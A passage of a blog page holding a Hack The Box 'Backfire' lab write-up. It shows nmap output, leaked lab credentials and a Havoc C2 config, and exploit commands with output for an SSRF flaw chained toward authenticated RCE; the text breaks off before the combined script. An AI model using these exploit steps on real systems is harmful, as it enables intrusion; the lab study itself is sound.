@@ -1,0 +1,849 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Muyi">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/07/07/hackthebox/htb-backfire/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/elmo-launch.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/elmo-launch.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/elmo-launch.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            HTB-Backfire | Muyi&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":5,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":false,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Blog for storing the knowledges I need (;","subtitle":{"text":["sudo echo \"subtitle goes here\""],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":150,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2025/1/22 12:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Muyi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">37</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">HTB-Backfire</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/elmo.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Muyi</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-07-07 20:57:17</span>
+        <span class="mobile">2025-07-07 20:57:17</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-08-17 13:12:20</span>
+            <span class="mobile">2025-08-17 13:12:20</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Medium/">Medium</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/HTB/">HTB</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Linux/">Linux</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>nmap</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.94SVN scan initiated Sun Jan 19 10:59:19 2025 as: /usr/lib/nmap/nmap --privileged -sV -T5 -o nmap 10.10.11.49</span><br><span class="line">Nmap scan report for 10.10.11.49</span><br><span class="line">Host is up (0.015s latency).</span><br><span class="line">Not shown: 943 closed tcp ports (reset), 53 filtered tcp ports (no-response), 1 filtered tcp ports (port-unreach)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)</span><br><span class="line">443/tcp  open  ssl/http nginx 1.22.1</span><br><span class="line">8000/tcp open  http     nginx 1.22.1</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Sun Jan 19 10:59:35 2025 -- 1 IP address (1 host up) scanned in 15.20 seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>in 8000 contain two files</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">disable_tls.patch:</span><br><span class="line">Disable TLS for Websocket management port 40056, so I can prove that</span><br><span class="line">sergej is not doing any work</span><br><span class="line">Management port only allows local connections (we use ssh forwarding) so</span><br><span class="line">this will not compromize our teamserver</span><br><span class="line"></span><br><span class="line">diff --git a/client/src/Havoc/Connector.cc b/client/src/Havoc/Connector.cc</span><br><span class="line">index abdf1b5..6be76fb 100644</span><br><span class="line">--- a/client/src/Havoc/Connector.cc</span><br><span class="line">+++ b/client/src/Havoc/Connector.cc</span><br><span class="line">@@ -8,12 +8,11 @@ Connector::Connector( Util::ConnectionInfo* ConnectionInfo )</span><br><span class="line"> &#123;</span><br><span class="line">     Teamserver   = ConnectionInfo;</span><br><span class="line">     Socket       = new QWebSocket();</span><br><span class="line">-    auto Server  = &quot;wss://&quot; + Teamserver-&gt;Host + &quot;:&quot; + this-&gt;Teamserver-&gt;Port + &quot;/havoc/&quot;;</span><br><span class="line">+    auto Server  = &quot;ws://&quot; + Teamserver-&gt;Host + &quot;:&quot; + this-&gt;Teamserver-&gt;Port + &quot;/havoc/&quot;;</span><br><span class="line">     auto SslConf = Socket-&gt;sslConfiguration();</span><br><span class="line"></span><br><span class="line">     /* ignore annoying SSL errors */</span><br><span class="line">     SslConf.setPeerVerifyMode( QSslSocket::VerifyNone );</span><br><span class="line">-    Socket-&gt;setSslConfiguration( SslConf );</span><br><span class="line">     Socket-&gt;ignoreSslErrors();</span><br><span class="line"></span><br><span class="line">     QObject::connect( Socket, &amp;QWebSocket::binaryMessageReceived, this, [&amp;]( const QByteArray&amp; Message )</span><br><span class="line">diff --git a/teamserver/cmd/server/teamserver.go b/teamserver/cmd/server/teamserver.go</span><br><span class="line">index 9d1c21f..59d350d 100644</span><br><span class="line">--- a/teamserver/cmd/server/teamserver.go</span><br><span class="line">+++ b/teamserver/cmd/server/teamserver.go</span><br><span class="line">@@ -151,7 +151,7 @@ func (t *Teamserver) Start() &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                // start the teamserver</span><br><span class="line">-               if err = t.Server.Engine.RunTLS(Host+&quot;:&quot;+Port, certPath, keyPath); err != nil &#123;</span><br><span class="line">+               if err = t.Server.Engine.Run(Host+&quot;:&quot;+Port); err != nil &#123;</span><br><span class="line">                        logger.Error(&quot;Failed to start websocket: &quot; + err.Error())</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">havoc.yaotl:</span><br><span class="line">Teamserver &#123;</span><br><span class="line">    Host = &quot;127.0.0.1&quot;</span><br><span class="line">    Port = 40056</span><br><span class="line"></span><br><span class="line">    Build &#123;</span><br><span class="line">        Compiler64 = &quot;data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc&quot;</span><br><span class="line">        Compiler86 = &quot;data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc&quot;</span><br><span class="line">        Nasm = &quot;/usr/bin/nasm&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Operators &#123;</span><br><span class="line">    user &quot;ilya&quot; &#123;</span><br><span class="line">        Password = &quot;CobaltStr1keSuckz!&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    user &quot;sergej&quot; &#123;</span><br><span class="line">        Password = &quot;1w4nt2sw1tch2h4rdh4tc2&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Demon &#123;</span><br><span class="line">    Sleep = 2</span><br><span class="line">    Jitter = 15</span><br><span class="line"></span><br><span class="line">    TrustXForwardedFor = false</span><br><span class="line"></span><br><span class="line">    Injection &#123;</span><br><span class="line">        Spawn64 = &quot;C:\\Windows\\System32\\notepad.exe&quot;</span><br><span class="line">        Spawn32 = &quot;C:\\Windows\\SysWOW64\\notepad.exe&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Listeners &#123;</span><br><span class="line">    Http &#123;</span><br><span class="line">        Name = &quot;Demon Listener&quot;</span><br><span class="line">        Hosts = [</span><br><span class="line">            &quot;backfire.htb&quot;</span><br><span class="line">        ]</span><br><span class="line">        HostBind = &quot;127.0.0.1&quot;</span><br><span class="line">        PortBind = 8443</span><br><span class="line">        PortConn = 8443</span><br><span class="line">        HostRotation = &quot;round-robin&quot;</span><br><span class="line">        Secure = true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>havoc.yaotl gives out hint that this machine is related to Havoc C2 Server.</p>
+<p>By referring to the github repositories by the challenge creators [hyperreality] &amp; [chebuya]:</p>
+<ol>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/IncludeSecurity/c2-vulnerabilities/tree/main/havoc_auth_rce" >https://github.com/IncludeSecurity/c2-vulnerabilities/tree/main/havoc_auth_rce<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/chebuya/Havoc-C2-SSRF-poc" >https://github.com/chebuya/Havoc-C2-SSRF-poc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>Using havoc_auth_rce, it will not work as the havoc teamserver’s are faced internally:<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ python3 cve.py</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/home/muyi/Desktop/htb/lab/backfire~10.10.11.49/C2-Havoc-SSRF/cve.py&quot;, line 11, in &lt;module&gt;</span><br><span class="line">    ws = create_connection(f&quot;wss://&#123;HOSTNAME&#125;:&#123;PORT&#125;/havoc/&quot;,</span><br><span class="line">         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File &quot;/usr/lib/python3/dist-packages/websocket/_core.py&quot;, line 646, in create_connection</span><br><span class="line">    websock.connect(url, **options)</span><br><span class="line">  File &quot;/usr/lib/python3/dist-packages/websocket/_core.py&quot;, line 256, in connect</span><br><span class="line">    self.sock, addrs = connect(</span><br><span class="line">                       ^^^^^^^^</span><br><span class="line">  File &quot;/usr/lib/python3/dist-packages/websocket/_http.py&quot;, line 145, in connect</span><br><span class="line">    sock = _open_socket(addrinfo_list, options.sockopt, options.timeout)</span><br><span class="line">           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File &quot;/usr/lib/python3/dist-packages/websocket/_http.py&quot;, line 232, in _open_socket</span><br><span class="line">    raise err</span><br><span class="line">  File &quot;/usr/lib/python3/dist-packages/websocket/_http.py&quot;, line 209, in _open_socket</span><br><span class="line">    sock.connect(address)</span><br><span class="line">ConnectionRefusedError: [Errno 111] Connection refused</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<p>However, for SSRF PoC, it works after some minor configuration:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ python3 exploit.py -t https://10.10.11.49 -i 127.0.0.1 -p 40056</span><br><span class="line">[***] Trying to register agent...</span><br><span class="line">[***] Success!</span><br><span class="line">[***] Trying to open socket on the teamserver...</span><br><span class="line">[***] Success!</span><br><span class="line">[***] Trying to write to the socket</span><br><span class="line">[***] Success!</span><br><span class="line">[***] Trying to poll teamserver for socket output...</span><br><span class="line">[***] Read socket output successfully!</span><br><span class="line">HTTP/1.1 301 Moved Permanently</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Location: /home/</span><br><span class="line">Date: Sun, 19 Jan 2025 11:53:15 GMT</span><br><span class="line">Content-Length: 41</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;a href=&quot;/home/&quot;&gt;Moved Permanently&lt;/a&gt;.</span><br></pre></td></tr></table></figure></div>
+
+<p>Right now the main goal is to use SSRF to trigger the Auth RCE in order to get user by combining both the scripts:</p>
+<h2 id="Using-the-script-below"><a href="#Using-the-script-below" class="headerlink" title="Using the script below:"></a>Using the script below:</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span 